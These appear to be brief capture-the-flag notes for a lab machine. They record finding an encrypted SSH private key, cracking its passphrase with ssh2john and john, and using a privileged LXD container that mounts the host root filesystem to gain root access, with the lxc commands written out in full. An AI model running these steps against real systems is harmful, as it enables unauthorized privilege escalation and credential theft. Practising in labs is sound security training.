standard enum, /uploads/ page has dict, image and message	

/secret has id_rsa with encrypted key

ssh2john id_rsa and john showed key is letmein

lxc image import ./apline-v3.10-x86_64-20191008_1227.tar.gz --alias myimage



    lxc init myimage ignite -c security.privileged=true

    lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true

    lxc start ignite

    lxc exec ignite /bin/sh
